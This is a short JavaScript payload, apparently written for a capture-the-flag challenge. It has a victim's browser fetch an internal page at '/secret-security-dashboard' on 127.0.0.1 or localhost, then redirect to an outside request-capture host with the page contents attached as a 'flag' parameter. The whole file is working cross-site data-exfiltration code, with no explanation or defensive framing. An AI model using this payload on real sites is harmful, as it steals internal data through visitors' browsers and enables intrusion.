fetch('http://127.0.0.1/secret-security-dashboard')
  .then(response => response.text())
  .then(data => {
    window.location = 'https://khanh.free.beeceptor.com/?flag=' + encodeURIComponent(data);
  })
  .catch(e => {
    fetch('http://localhost/secret-security-dashboard')
      .then(res => res.text())
      .then(data2 => {
        window.location = 'https://khanh.free.beeceptor.com/?flag=' + encodeURIComponent(data2);
      });
  });
